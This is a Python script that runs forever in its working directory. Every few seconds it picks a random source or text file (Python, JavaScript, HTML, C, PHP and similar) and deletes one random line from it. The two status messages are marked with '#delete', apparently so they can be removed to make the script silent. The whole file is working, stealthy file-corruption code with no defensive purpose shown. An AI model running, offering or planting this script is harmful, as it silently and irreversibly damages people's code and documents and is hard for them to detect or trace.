import os
import random
import time
import sys

def get_target_files(directory):
    valid_extensions = ['.py', '.js', '.html', '.css', '.txt', '.java', '.cpp', '.c', '.php']
    all_files = []
    
    for root, dirs, files in os.walk(directory):
        for file in files:
            if file == os.path.basename(__file__):
                continue
            if any(file.endswith(ext) for ext in valid_extensions):
                all_files.append(os.path.join(root, file))
    
    return all_files

def delete_random_line(filepath):
    try:
        with open(filepath, 'r', encoding='utf-8') as f:
            lines = f.readlines()
        
        if not lines:
            return
        
        line_to_delete = random.randint(0, len(lines)-1)
        del lines[line_to_delete]
        
        with open(filepath, 'w', encoding='utf-8') as f:
            f.writelines(lines)
        
        print(f"Deleted line {line_to_delete+1} from {os.path.basename(filepath)}") #delete
    
    except Exception as e:
        print(f"Error processing {filepath}: {str(e)}")

def main():
    current_dir = os.getcwd()
    print(f"WARNING: Script active in [{current_dir}]. Monitoring files...") #delete
    
    while True:
        time.sleep(random.randint(1, 10))
        
        target_files = get_target_files(current_dir)
        if not target_files:
            continue
        
        selected_file = random.choice(target_files)
        delete_random_line(selected_file)

if __name__ == "__main__":
    main()